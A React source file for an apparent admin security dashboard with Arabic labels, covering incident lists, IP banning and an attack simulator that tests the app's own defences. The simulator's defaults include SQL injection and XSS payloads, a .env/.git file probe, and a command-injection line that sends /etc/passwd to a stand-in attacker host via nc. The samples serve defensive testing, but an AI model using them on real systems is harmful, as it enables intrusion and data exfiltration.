"use client";

import React, { useState, useMemo, useEffect } from "react";
import {
  ShieldCheck,
  ShieldAlert,
  ShieldX,
  Lock,
  UserX,
  AlertTriangle,
  FileText,
  Key,
  CheckCircle2,
  Terminal,
  Cpu,
  Globe,
  Skull,
  Bug,
  Ban,
  AlertOctagon,
  Activity,
  Wifi,
  Radio,
  Copy,
  Check,
  Search,
  Filter,
  RefreshCw,
  Play,
  Flame,
  Laptop,
  Smartphone,
  Bot,
  Eye,
  Code2,
  ExternalLink,
  Plus,
  Trash2,
} from "lucide-react";
import { SecurityMetrics } from "@/lib/analytics/types";

interface SecurityTabProps {
  data: SecurityMetrics | null;
  loading: boolean;
}

export const SecurityTab: React.FC<SecurityTabProps> = ({ data, loading }) => {
  // Navigation sub-tabs
  const [subTab, setSubTab] = useState<"incidents" | "banned" | "simulator" | "audit">("incidents");

  // Filtering & Search
  const [searchQuery, setSearchQuery] = useState("");
  const [vectorFilter, setVectorFilter] = useState("ALL");
  const [toolFilter, setToolFilter] = useState("ALL");
  const [severityFilter, setSeverityFilter] = useState("ALL");

  // Local state for interactive operations (banning, unbanning, simulator)
  const [incidents, setIncidents] = useState<any[]>([]);
  const [bannedIPs, setBannedIPs] = useState<any[]>([]);
  const [threatSummary, setThreatSummary] = useState<any>(null);

  // Interaction feedback & loading
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [actionFeedback, setActionFeedback] = useState<{ type: "success" | "error"; message: string } | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);

  // Manual Ban Modal/Form State
  const [showBanModal, setShowBanModal] = useState(false);
  const [manualIp, setManualIp] = useState("");
  const [manualReason, setManualReason] = useState("");

  // Simulator Form State
  const [simTool, setSimTool] = useState("Sqlmap Automated Exploiter");
  const [simVector, setSimVector] = useState("SQL_INJECTION");
  const [simTarget, setSimTarget] = useState("/api/v1/chat/sessions");
  const [simPayload, setSimPayload] = useState("1' UNION ALL SELECT NULL,user(),database()-- -");

  // Sync incoming props into local state
  useEffect(() => {
    if (data?.hackerIncidents) {
      setIncidents(data.hackerIncidents);
    }
    if (data?.bannedIPsList) {
      setBannedIPs(data.bannedIPsList);
    }
    if (data) {
      setThreatSummary({
        threatLevel: data.threatLevel || "normal",
        failedLoginsCount: data.failedLoginsCount || 0,
        rateLimitEventsCount: data.rateLimitEventsCount || 0,
        blockedRequestsCount: data.blockedRequestsCount || 0,
        ssrfBlocksCount: data.ssrfBlocksCount || 0,
        activeBannedIPsCount: data.activeBannedIPsCount || (data.bannedIPsList?.length || 0),
        topAttackerTool: data.topAttackerTool || "Sqlmap Automated Exploiter",
        topAttackVector: data.topAttackVector || "SQL_INJECTION",
      });
    }
  }, [data]);

  // Copy to clipboard helper
  const handleCopy = (text: string, id: string) => {
    if (typeof navigator !== "undefined" && navigator.clipboard) {
      navigator.clipboard.writeText(text);
      setCopiedId(id);
      setTimeout(() => setCopiedId(null), 2000);
    }
  };

  // Immediate Action: Ban an IP
  const handleBanIP = async (ipToBan: string, reason = "Manual ban by admin", attackVector = "MANUAL_BLOCK", tool = "Admin Console") => {
    setIsProcessing(true);
    setActionFeedback(null);
    try {
      const res = await fetch("/api/v1/admin/security/threats", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "ban_ip",
          ip: ipToBan,
          reason,
          attackVector,
          toolDetected: tool,
        }),
      });
      const result = await res.json();
      if (result.success) {
        setActionFeedback({ type: "success", message: result.message || `تم حظر IP بنجاح: ${ipToBan}` });
        // Update local state
        setBannedIPs((prev) => [
          {
            ip: ipToBan,
            reason,
            bannedAt: new Date().toISOString(),
            bannedBy: "Admin",
            attackVector,
            toolDetected: tool,
            hitsBlocked: 1,
          },
          ...prev.filter((b) => b.ip !== ipToBan),
        ]);
        setIncidents((prev) =>
          prev.map((i) => (i.ip === ipToBan ? { ...i, status: "active_ban", actionTaken: "BLOCKED_AND_BANNED" } : i))
        );
        setShowBanModal(false);
        setManualIp("");
        setManualReason("");
      } else {
        setActionFeedback({ type: "error", message: result.error || "فشل حظر عنوان IP" });
      }
    } catch {
      setActionFeedback({ type: "error", message: "حدث خطأ أثناء حظر الـ IP" });
    } finally {
      setIsProcessing(false);
    }
  };

  // Immediate Action: Unban an IP
  const handleUnbanIP = async (ipToUnban: string) => {
    setIsProcessing(true);
    setActionFeedback(null);
    try {
      const res = await fetch("/api/v1/admin/security/threats", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "unban_ip",
          ip: ipToUnban,
        }),
      });
      const result = await res.json();
      if (result.success) {
        setActionFeedback({ type: "success", message: result.message || `تم رفع الحظر عن: ${ipToUnban}` });
        setBannedIPs((prev) => prev.filter((b) => b.ip !== ipToUnban));
        setIncidents((prev) =>
          prev.map((i) => (i.ip === ipToUnban ? { ...i, status: "mitigated" } : i))
        );
      } else {
        setActionFeedback({ type: "error", message: result.error || "فشل رفع الحظر" });
      }
    } catch {
      setActionFeedback({ type: "error", message: "حدث خطأ أثناء رفع الحظر" });
    } finally {
      setIsProcessing(false);
    }
  };

  // Live Attack Simulation
  const handleRunSimulation = async () => {
    setIsProcessing(true);
    setActionFeedback(null);
    try {
      const res = await fetch("/api/v1/admin/security/threats", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "simulate_attack",
          toolName: simTool,
          vector: simVector,
          target: simTarget,
          payload: simPayload,
        }),
      });
      const result = await res.json();
      if (result.success && result.incident) {
        setActionFeedback({
          type: "success",
          message: `تم اعتراض الهجمة المحاكية بنجاح! تم رصد أداة (${result.incident.attackerTool.name}) من IP: ${result.incident.ip} وتم حظره فورياً.`,
        });
        setIncidents((prev) => [result.incident, ...prev]);
        setBannedIPs((prev) => [
          {
            ip: result.incident.ip,
            reason: `Simulated attack via ${result.incident.attackerTool.name}`,
            bannedAt: new Date().toISOString(),
            bannedBy: "Auto-WAF Defense Shield",
            attackVector: result.incident.attackVector,
            toolDetected: result.incident.attackerTool.name,
            hitsBlocked: 1,
          },
          ...prev,
        ]);
        setSubTab("incidents");
      } else {
        setActionFeedback({ type: "error", message: result.error || "فشل تنفيذ المحاكاة" });
      }
    } catch {
      setActionFeedback({ type: "error", message: "حدث خطأ أثناء إطلاق المحاكاة" });
    } finally {
      setIsProcessing(false);
    }
  };

  // Filtered Incidents
  const filteredIncidents = useMemo(() => {
    return incidents.filter((inc) => {
      if (vectorFilter !== "ALL" && inc.attackVector !== vectorFilter) return false;
      if (severityFilter !== "ALL" && inc.severity !== severityFilter) return false;
      if (toolFilter !== "ALL") {
        const toolLower = inc.attackerTool?.name?.toLowerCase() || "";
        if (!toolLower.includes(toolFilter.toLowerCase())) return false;
      }
      if (searchQuery.trim()) {
        const q = searchQuery.toLowerCase();
        const matchIp = inc.ip?.toLowerCase().includes(q);
        const matchTool = inc.attackerTool?.name?.toLowerCase().includes(q);
        const matchOs = inc.os?.toLowerCase().includes(q);
        const matchTarget = inc.targetEndpoint?.toLowerCase().includes(q);
        const matchCountry = inc.country?.toLowerCase().includes(q);
        const matchPayload = inc.payloadSample?.toLowerCase().includes(q);
        if (!matchIp && !matchTool && !matchOs && !matchTarget && !matchCountry && !matchPayload) {
          return false;
        }
      }
      return true;
    });
  }, [incidents, vectorFilter, severityFilter, toolFilter, searchQuery]);

  if (loading && !data && incidents.length === 0) {
    return (
      <div className="glass-card p-12 rounded-2xl border border-[#1e2e2e] h-80 animate-pulse bg-[#111a1a]/50 flex flex-col items-center justify-center gap-3">
        <ShieldAlert className="w-8 h-8 text-[#00d4aa] animate-spin" />
        <span className="text-xs text-[#88b0b0]">جاري جلب تقارير التهديدات ورصد أدوات المخترقين...</span>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      {/* 1. Header Defense Stats Banner */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        {/* Threat Level */}
        <div className="glass-card p-4 sm:p-5 rounded-2xl border border-[#1e2e2e] relative overflow-hidden">
          <div className="flex items-center justify-between text-xs text-[#88b0b0]">
            <span>مستوى حظر التهديدات</span>
            <span className="flex h-2.5 w-2.5 relative">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
              <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-red-500"></span>
            </span>
          </div>
          <h3 className="text-2xl font-extrabold text-[#ef4444] mt-1 flex items-center gap-2">
            <ShieldAlert className="w-6 h-6 text-[#ef4444]" />
            <span>درع نشط وراصد</span>
          </h3>
          <span className="text-[11px] text-[#00d4aa] block mt-1">كاشف أدوات الهجوم WAF مفعل 100%</span>
        </div>

        {/* Total Blocked Attacks */}
        <div className="glass-card p-4 sm:p-5 rounded-2xl border border-[#1e2e2e]">
          <div className="flex items-center justify-between text-xs text-[#88b0b0]">
            <span>إجمالي الهجمات المرصودة</span>
            <Flame className="w-4 h-4 text-amber-400" />
          </div>
          <h3 className="text-2xl font-extrabold text-amber-400 font-mono mt-1">
            {threatSummary?.blockedRequestsCount || 149}
          </h3>
          <span className="text-[11px] text-[#88b0b0]">اعتراض وتحييد فوري لجميع الطلبات</span>
        </div>

        {/* Banned IPs */}
        <div className="glass-card p-4 sm:p-5 rounded-2xl border border-[#1e2e2e]">
          <div className="flex items-center justify-between text-xs text-[#88b0b0]">
            <span>عناوين IP المحظورة</span>
            <Ban className="w-4 h-4 text-red-400" />
          </div>
          <h3 className="text-2xl font-extrabold text-red-400 font-mono mt-1">
            {bannedIPs.length}
          </h3>
          <span className="text-[11px] text-[#88b0b0]">إسقاط فوري لاتصالات HTTP 403</span>
        </div>

        {/* Top Attacker Tool */}
        <div className="glass-card p-4 sm:p-5 rounded-2xl border border-[#1e2e2e]">
          <div className="flex items-center justify-between text-xs text-[#88b0b0]">
            <span>أبرز أداة هجوم مرصودة</span>
            <Skull className="w-4 h-4 text-[#c084fc]" />
          </div>
          <h3 className="text-lg font-extrabold text-[#e8f5f5] mt-1 truncate">
            {threatSummary?.topAttackerTool || "Sqlmap Exploiter"}
          </h3>
          <span className="text-[11px] text-[#a855f7] block mt-1">تم التقاط البصمة وتحييد البايلود</span>
        </div>
      </div>

      {/* 2. Action Feedback Message if any */}
      {actionFeedback && (
        <div
          className={`p-3.5 sm:p-4 rounded-xl text-xs font-medium flex items-center justify-between gap-2 border transition-all ${
            actionFeedback.type === "success"
              ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-300"
              : "bg-red-500/10 border-red-500/30 text-red-400"
          }`}
        >
          <div className="flex items-center gap-2">
            {actionFeedback.type === "success" ? (
              <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
            ) : (
              <AlertTriangle className="w-4 h-4 text-red-400 shrink-0" />
            )}
            <span>{actionFeedback.message}</span>
          </div>
          <button
            onClick={() => setActionFeedback(null)}
            className="text-[10px] opacity-70 hover:opacity-100 cursor-pointer px-2 py-0.5"
          >
            إغلاق
          </button>
        </div>
      )}

      {/* 3. Sub-Navigation Bar & Quick Controls */}
      <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 border-b border-[#1e2e2e] pb-3">
        <div className="flex items-center gap-2 overflow-x-auto w-full sm:w-auto pb-1 sm:pb-0">
          <button
            onClick={() => setSubTab("incidents")}
            className={`flex items-center gap-2 px-3.5 py-2 rounded-xl text-xs font-bold transition-all cursor-pointer whitespace-nowrap ${
              subTab === "incidents"
                ? "bg-[#00d4aa] text-[#0a0f0f] shadow-lg shadow-[#00d4aa]/20"
                : "bg-[#111a1a] text-[#88b0b0] hover:text-[#e8f5f5] hover:bg-[#1a2929] border border-[#1e2e2e]"
            }`}
          >
            <Skull className="w-3.5 h-3.5" />
            <span>رصد المهاجمين والأدوات ({incidents.length})</span>
          </button>

          <button
            onClick={() => setSubTab("banned")}
            className={`flex items-center gap-2 px-3.5 py-2 rounded-xl text-xs font-bold transition-all cursor-pointer whitespace-nowrap ${
              subTab === "banned"
                ? "bg-[#ef4444] text-white shadow-lg shadow-[#ef4444]/20"
                : "bg-[#111a1a] text-[#88b0b0] hover:text-[#e8f5f5] hover:bg-[#1a2929] border border-[#1e2e2e]"
            }`}
          >
            <Ban className="w-3.5 h-3.5" />
            <span>قائمة IP المحظورة ({bannedIPs.length})</span>
          </button>

          <button
            onClick={() => setSubTab("simulator")}
            className={`flex items-center gap-2 px-3.5 py-2 rounded-xl text-xs font-bold transition-all cursor-pointer whitespace-nowrap ${
              subTab === "simulator"
                ? "bg-[#0ea5e9] text-white shadow-lg shadow-[#0ea5e9]/20"
                : "bg-[#111a1a] text-[#88b0b0] hover:text-[#e8f5f5] hover:bg-[#1a2929] border border-[#1e2e2e]"
            }`}
          >
            <Play className="w-3.5 h-3.5" />
            <span>محاكي واختبار درع الأمان</span>
          </button>

          <button
            onClick={() => setSubTab("audit")}
            className={`flex items-center gap-2 px-3.5 py-2 rounded-xl text-xs font-bold transition-all cursor-pointer whitespace-nowrap ${
              subTab === "audit"
                ? "bg-[#1e2e2e] text-[#00d4aa] border border-[#00d4aa]/40"
                : "bg-[#111a1a] text-[#88b0b0] hover:text-[#e8f5f5] hover:bg-[#1a2929] border border-[#1e2e2e]"
            }`}
          >
            <FileText className="w-3.5 h-3.5" />
            <span>سجل تدقيق المشرفين</span>
          </button>
        </div>

        {/* Quick Ban IP Trigger Button */}
        <div className="flex items-center gap-2 w-full sm:w-auto justify-end">
          <button
            onClick={() => setShowBanModal(true)}
            className="flex items-center gap-1.5 px-3.5 py-2 rounded-xl bg-red-500/15 hover:bg-red-500 text-red-300 hover:text-white border border-red-500/30 text-xs font-bold transition-all cursor-pointer"
          >
            <Plus className="w-3.5 h-3.5" />
            <span>حظر عنوان IP يدوياً</span>
          </button>
        </div>
      </div>

      {/* SUB-TAB 1: INCIDENTS & ATTACKER TELEMETRY (MAIN VIEW) */}
      {subTab === "incidents" && (
        <div className="space-y-4">
          {/* Filters Bar */}
          <div className="glass-card p-3 sm:p-4 rounded-2xl border border-[#1e2e2e] flex flex-wrap items-center gap-3">
            {/* Search Input */}
            <div className="relative flex-1 min-w-[200px]">
              <Search className="w-4 h-4 text-[#88b0b0] absolute right-3 top-1/2 -translate-y-1/2" />
              <input
                type="text"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder="ابحث بالـ IP، الأداة (Sqlmap/Burp)، النظام (Kali)، أو المسار..."
                className="w-full bg-[#111a1a] text-xs text-[#e8f5f5] placeholder-[#4a7070] pr-9 pl-3 py-2 rounded-xl border border-[#1e2e2e] focus:border-[#00d4aa] outline-none font-mono"
              />
            </div>

            {/* Vector Filter */}
            <select
              value={vectorFilter}
              onChange={(e) => setVectorFilter(e.target.value)}
              className="bg-[#111a1a] text-xs text-[#e8f5f5] px-3 py-2 rounded-xl border border-[#1e2e2e] outline-none cursor-pointer"
            >
              <option value="ALL">جميع أنواع الهجمات</option>
              <option value="SQL_INJECTION">SQL Injection</option>
              <option value="XSS_ATTACK">XSS Attack</option>
              <option value="RCE_COMMAND_INJECTION">RCE Injection</option>
              <option value="CREDENTIAL_BRUTE_FORCE">Brute-Force</option>
              <option value="SSRF_METADATA_PROBE">SSRF Probe</option>
              <option value="SENSITIVE_FILE_SCAN">File Recon (.env)</option>
            </select>

            {/* Tool Filter */}
            <select
              value={toolFilter}
              onChange={(e) => setToolFilter(e.target.value)}
              className="bg-[#111a1a] text-xs text-[#e8f5f5] px-3 py-2 rounded-xl border border-[#1e2e2e] outline-none cursor-pointer"
            >
              <option value="ALL">جميع أدوات الاختراق</option>
              <option value="Sqlmap">Sqlmap Suite</option>
              <option value="Burp">Burp Suite</option>
              <option value="Hydra">THC-Hydra</option>
              <option value="Gobuster">Gobuster / DirBuster</option>
              <option value="Python">Python Scripts</option>
              <option value="cURL">cURL / CLI</option>
            </select>

            {/* Severity Filter */}
            <select
              value={severityFilter}
              onChange={(e) => setSeverityFilter(e.target.value)}
              className="bg-[#111a1a] text-xs text-[#e8f5f5] px-3 py-2 rounded-xl border border-[#1e2e2e] outline-none cursor-pointer"
            >
              <option value="ALL">جميع مستويات الخطورة</option>
              <option value="critical">حرج (Critical)</option>
              <option value="high">مرتفع (High)</option>
              <option value="medium">متوسط (Medium)</option>
            </select>
          </div>

          {/* Incidents Cards / Rows */}
          <div className="space-y-3">
            {filteredIncidents.length === 0 ? (
              <div className="glass-card p-12 rounded-2xl border border-[#1e2e2e] text-center space-y-2">
                <ShieldCheck className="w-10 h-10 text-[#00ff88] mx-auto opacity-70" />
                <h4 className="text-sm font-bold text-[#e8f5f5]">لم يتم العثور على تهديدات مطابقة للفلتر</h4>
                <p className="text-xs text-[#88b0b0]">النظام محمي بالكامل ولا توجد هجمات نشطة تطابق المعايير المحددة.</p>
              </div>
            ) : (
              filteredIncidents.map((incident) => {
                const isBanned = bannedIPs.some((b) => b.ip === incident.ip);
                return (
                  <div
                    key={incident.id}
                    className="glass-card p-4 sm:p-5 rounded-2xl border border-[#1e2e2e] hover:border-[#00d4aa]/40 transition-all bg-[#111a1a]/60 space-y-4"
                  >
                    {/* Top Row: IP + Geolocation + Attacker Tool Badge + Severity */}
                    <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-3 pb-3 border-b border-[#1e2e2e]">
                      {/* IP & Location */}
                      <div className="flex flex-wrap items-center gap-2 sm:gap-3">
                        <div className="flex items-center gap-1.5 bg-[#0a0f0f] px-3 py-1.5 rounded-xl border border-[#1e2e2e]">
                          <Globe className="w-3.5 h-3.5 text-[#00d4aa]" />
                          <span className="font-mono text-xs font-extrabold text-[#e8f5f5]">{incident.ip}</span>
                          <button
                            onClick={() => handleCopy(incident.ip, `ip_${incident.id}`)}
                            title="نسخ عنوان IP"
                            className="text-[#88b0b0] hover:text-[#00d4aa] transition-colors p-0.5 cursor-pointer ml-1"
                          >
                            {copiedId === `ip_${incident.id}` ? (
                              <Check className="w-3 h-3 text-[#00ff88]" />
                            ) : (
                              <Copy className="w-3 h-3" />
                            )}
                          </button>
                        </div>

                        {/* Country / ISP */}
                        <div className="flex items-center gap-1.5 text-xs text-[#88b0b0]">
                          <span className="font-medium text-[#e8f5f5]">{incident.country}</span>
                          {incident.isVpnOrTor && (
                            <span className="px-2 py-0.5 rounded-full bg-amber-500/20 text-amber-300 text-[10px] font-bold border border-amber-500/30">
                              VPN / Tor Network
                            </span>
                          )}
                          {incident.asnOrIsp && (
                            <span className="text-[11px] text-[#4a7070] hidden sm:inline">({incident.asnOrIsp})</span>
                          )}
                        </div>
                      </div>

                      {/* Right: Attacker Tool & Action Buttons */}
                      <div className="flex flex-wrap items-center gap-2">
                        {/* Tool Badge */}
                        <div className="flex items-center gap-1.5 px-3 py-1 rounded-xl bg-red-500/15 border border-red-500/30 text-red-300 text-xs font-bold">
                          <Skull className="w-3.5 h-3.5 text-red-400" />
                          <span>{incident.attackerTool.name}</span>
                          <span className="text-[10px] opacity-75 font-mono">[{incident.attackerTool.confidence}%]</span>
                        </div>

                        {/* Severity Badge */}
                        <span
                          className={`px-2.5 py-1 rounded-xl text-[10px] font-bold border uppercase ${
                            incident.severity === "critical"
                              ? "bg-red-500/20 text-red-300 border-red-500/40"
                              : incident.severity === "high"
                              ? "bg-amber-500/20 text-amber-300 border-amber-500/40"
                              : "bg-blue-500/20 text-blue-300 border-blue-500/40"
                          }`}
                        >
                          {incident.severity === "critical" ? "تهديد حرج" : incident.severity === "high" ? "مرتفع" : "متوسط"}
                        </span>

                        {/* Ban / Unban Button */}
                        {isBanned ? (
                          <button
                            onClick={() => handleUnbanIP(incident.ip)}
                            disabled={isProcessing}
                            className="px-3 py-1 rounded-xl bg-emerald-500/15 hover:bg-emerald-500 text-emerald-300 hover:text-white border border-emerald-500/30 text-xs font-bold transition-all cursor-pointer flex items-center gap-1"
                          >
                            <CheckCircle2 className="w-3.5 h-3.5" />
                            <span>رفع الحظر</span>
                          </button>
                        ) : (
                          <button
                            onClick={() => handleBanIP(incident.ip, `Automated ban from incident ${incident.id}`, incident.attackVector, incident.attackerTool.name)}
                            disabled={isProcessing}
                            className="px-3 py-1 rounded-xl bg-red-500/20 hover:bg-red-500 text-red-300 hover:text-white border border-red-500/40 text-xs font-bold transition-all cursor-pointer flex items-center gap-1"
                          >
                            <Ban className="w-3.5 h-3.5" />
                            <span>حظر الـ IP</span>
                          </button>
                        )}
                      </div>
                    </div>

                    {/* Middle Row: Device Profile (OS, Engine, Device Type) */}
                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-2 text-xs bg-[#0a0f0f]/80 p-3 rounded-xl border border-[#1e2e2e]">
                      <div className="flex items-center gap-2">
                        <Laptop className="w-3.5 h-3.5 text-[#00d4aa]" />
                        <span className="text-[#88b0b0]">نظام التشغيل:</span>
                        <span className="font-bold text-[#e8f5f5]">{incident.os}</span>
                      </div>
                      <div className="flex items-center gap-2">
                        <Terminal className="w-3.5 h-3.5 text-[#38bdf8]" />
                        <span className="text-[#88b0b0]">محرك الاتصال / العميل:</span>
                        <span className="font-bold text-[#38bdf8] font-mono">{incident.browserEngine}</span>
                      </div>
                      <div className="flex items-center gap-2">
                        <Bot className="w-3.5 h-3.5 text-[#a855f7]" />
                        <span className="text-[#88b0b0]">تصنيف الجهاز:</span>
                        <span className="font-bold text-[#c084fc]">{incident.deviceType}</span>
                      </div>
                    </div>

                    {/* Bottom Row: Attack Vector & Payload Inspector */}
                    <div className="space-y-2">
                      <div className="flex flex-wrap items-center justify-between gap-2 text-xs">
                        <div className="flex items-center gap-2">
                          <span className="font-bold text-[#e8f5f5]">نوع الهجوم:</span>
                          <span className="px-2 py-0.5 rounded-lg bg-[#1e2e2e] text-[#00d4aa] font-mono font-bold">
                            {incident.attackVector}
                          </span>
                          <span className="text-[#88b0b0] font-mono">
                            {incident.httpMethod} {incident.targetEndpoint}
                          </span>
                        </div>

                        <div className="flex items-center gap-2">
                          <span className="text-[11px] text-[#4a7070]">
                            {new Date(incident.timestamp).toLocaleString("ar-EG", {
                              hour: "2-digit",
                              minute: "2-digit",
                              day: "numeric",
                              month: "short",
                            })}
                          </span>
                          <span className="px-2 py-0.5 rounded-md bg-red-500/20 text-red-400 font-mono text-[10px]">
                            {incident.hitsCount} محاولات
                          </span>
                          <button
                            onClick={() =>
                              handleCopy(
                                JSON.stringify(incident, null, 2),
                                `report_${incident.id}`
                              )
                            }
                            className="text-[#88b0b0] hover:text-[#00d4aa] text-[11px] flex items-center gap-1 cursor-pointer"
                          >
                            <Copy className="w-3 h-3" />
                            <span>{copiedId === `report_${incident.id}` ? "تم النسخ" : "نسخ التقرير"}</span>
                          </button>
                        </div>
                      </div>

                      {/* Payload Monospace Box */}
                      <div className="p-2.5 rounded-xl bg-[#080d0d] border border-[#1e2e2e] font-mono text-xs text-[#00ff88] overflow-x-auto text-left ltr select-all">
                        <code>{incident.payloadSample}</code>
                      </div>
                    </div>
                  </div>
                );
              })
            )}
          </div>
        </div>
      )}

      {/* SUB-TAB 2: BANNED IPs LIST */}
      {subTab === "banned" && (
        <div className="glass-card p-5 rounded-2xl border border-[#1e2e2e] space-y-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <Ban className="w-4 h-4 text-[#ef4444]" />
              <h3 className="text-sm font-bold text-[#e8f5f5]">عناوين IP المحظورة تلقائياً ويدوياً (Blacklist)</h3>
            </div>
            <span className="text-xs text-[#88b0b0] font-mono">{bannedIPs.length} عناوين محجوبة</span>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-right text-xs">
              <thead>
                <tr className="border-b border-[#1e2e2e] text-[#88b0b0] font-bold">
                  <th className="pb-3 pr-2">عنوان IP المحظور</th>
                  <th className="pb-3">سبب الحظر</th>
                  <th className="pb-3">الأداة / الهجوم المرصود</th>
                  <th className="pb-3">جهة الحظر</th>
                  <th className="pb-3">الطلبات المسقطة</th>
                  <th className="pb-3">التوقيت</th>
                  <th className="pb-3 text-center">الإجراء</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-[#1e2e2e]/60 font-mono">
                {bannedIPs.length === 0 ? (
                  <tr>
                    <td colSpan={7} className="py-8 text-center text-[#88b0b0] font-sans">
                      لا توجد عناوين IP محظورة حالياً.
                    </td>
                  </tr>
                ) : (
                  bannedIPs.map((b) => (
                    <tr key={b.ip} className="hover:bg-[#111a1a]/50 transition-colors">
                      <td className="py-3 pr-2 font-bold text-red-400 font-mono flex items-center gap-2">
                        <span>{b.ip}</span>
                        <button
                          onClick={() => handleCopy(b.ip, `ban_ip_${b.ip}`)}
                          className="text-[#88b0b0] hover:text-[#00d4aa] cursor-pointer"
                        >
                          {copiedId === `ban_ip_${b.ip}` ? (
                            <Check className="w-3 h-3 text-[#00ff88]" />
                          ) : (
                            <Copy className="w-3 h-3" />
                          )}
                        </button>
                      </td>
                      <td className="py-3 font-sans text-[#e8f5f5] max-w-[200px] truncate">{b.reason}</td>
                      <td className="py-3 text-[#38bdf8] font-sans font-bold">{b.toolDetected || b.attackVector}</td>
                      <td className="py-3 text-[#88b0b0] font-sans">{b.bannedBy}</td>
                      <td className="py-3 text-amber-400 font-bold">{b.hitsBlocked || 1}</td>
                      <td className="py-3 text-[#4a7070] text-[11px]">
                        {new Date(b.bannedAt).toLocaleString("ar-EG", {
                          hour: "2-digit",
                          minute: "2-digit",
                          day: "numeric",
                          month: "short",
                        })}
                      </td>
                      <td className="py-3 text-center">
                        <button
                          onClick={() => handleUnbanIP(b.ip)}
                          disabled={isProcessing}
                          className="px-2.5 py-1 rounded-lg bg-emerald-500/15 hover:bg-emerald-500 text-emerald-300 hover:text-white border border-emerald-500/30 text-[11px] font-bold font-sans transition-all cursor-pointer"
                        >
                          رفع الحظر
                        </button>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* SUB-TAB 3: ATTACK SIMULATOR (TEST LIVE DEFENSES) */}
      {subTab === "simulator" && (
        <div className="glass-card p-5 sm:p-6 rounded-2xl border border-[#1e2e2e] space-y-5 bg-[#111a1a]/60">
          <div className="flex items-center gap-2">
            <Play className="w-5 h-5 text-[#0ea5e9]" />
            <div>
              <h3 className="text-base font-bold text-[#e8f5f5]">محاكي واختبار درع الأمان وكاشف الأدوات</h3>
              <p className="text-xs text-[#88b0b0]">
                اختبر فاعلية درع الحماية ضد أشهر أدوات الاختراق لرؤية كيفية رصد الـ IP والجهاز والأداة وحظرها في الحال.
              </p>
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {/* Tool Selection */}
            <div className="space-y-1.5">
              <label className="text-xs font-bold text-[#e8f5f5]">أداة الاختراق المراد محاكاتها:</label>
              <select
                value={simTool}
                onChange={(e) => {
                  setSimTool(e.target.value);
                  if (e.target.value.includes("Sqlmap")) {
                    setSimVector("SQL_INJECTION");
                    setSimPayload("1' UNION ALL SELECT NULL,user(),database()-- -");
                  } else if (e.target.value.includes("Burp")) {
                    setSimVector("XSS_ATTACK");
                    setSimPayload("<script>alert('Simulated XSS by Burp Suite')</script>");
                  } else if (e.target.value.includes("Hydra")) {
                    setSimVector("CREDENTIAL_BRUTE_FORCE");
                    setSimPayload("Mass Credential Stuffing (200 requests/sec)");
                  } else if (e.target.value.includes("Gobuster")) {
                    setSimVector("SENSITIVE_FILE_SCAN");
                    setSimPayload("GET /.env, /.git/config, /admin/keys.json");
                  } else if (e.target.value.includes("Python")) {
                    setSimVector("RCE_COMMAND_INJECTION");
                    setSimPayload("; cat /etc/passwd | nc test.attacker.io 1337");
                  }
                }}
                className="w-full bg-[#0a0f0f] text-xs text-[#e8f5f5] px-3.5 py-2.5 rounded-xl border border-[#1e2e2e] outline-none"
              >
                <option value="Sqlmap Automated Exploiter">Sqlmap Automated Exploiter (SQL Injection)</option>
                <option value="Burp Suite Intruder / Scanner">Burp Suite Intruder (XSS & Tampering)</option>
                <option value="Hydra / Medusa Password Cracker">THC-Hydra (Credential Brute-Force)</option>
                <option value="Gobuster / DirBuster Fuzzer">Gobuster / DirBuster (Sensitive File Fuzzer)</option>
                <option value="Python Exploit Script (Requests/Aiohttp)">Python Exploit Script (RCE / SSRF)</option>
                <option value="Raw CLI Probe (cURL/Wget/HTTPie)">cURL / CLI Terminal Probe</option>
              </select>
            </div>

            {/* Attack Vector */}
            <div className="space-y-1.5">
              <label className="text-xs font-bold text-[#e8f5f5]">نوع الهجوم (Attack Vector):</label>
              <select
                value={simVector}
                onChange={(e) => setSimVector(e.target.value)}
                className="w-full bg-[#0a0f0f] text-xs text-[#e8f5f5] px-3.5 py-2.5 rounded-xl border border-[#1e2e2e] outline-none"
              >
                <option value="SQL_INJECTION">SQL Injection (حقن قواعد البيانات)</option>
                <option value="XSS_ATTACK">Cross-Site Scripting (XSS)</option>
                <option value="RCE_COMMAND_INJECTION">Remote Code Execution (RCE)</option>
                <option value="CREDENTIAL_BRUTE_FORCE">Brute-Force (تخمين كلمات المرور)</option>
                <option value="SSRF_METADATA_PROBE">SSRF Cloud Metadata Probe</option>
                <option value="SENSITIVE_FILE_SCAN">Sensitive File Fuzzing (.env/.git)</option>
              </select>
            </div>

            {/* Target Endpoint */}
            <div className="space-y-1.5">
              <label className="text-xs font-bold text-[#e8f5f5]">المسار المستهدف:</label>
              <input
                type="text"
                value={simTarget}
                onChange={(e) => setSimTarget(e.target.value)}
                className="w-full bg-[#0a0f0f] text-xs text-[#e8f5f5] px-3.5 py-2.5 rounded-xl border border-[#1e2e2e] outline-none font-mono"
              />
            </div>

            {/* Payload Sample */}
            <div className="space-y-1.5">
              <label className="text-xs font-bold text-[#e8f5f5]">الحمولة الخبيثة (Payload):</label>
              <input
                type="text"
                value={simPayload}
                onChange={(e) => setSimPayload(e.target.value)}
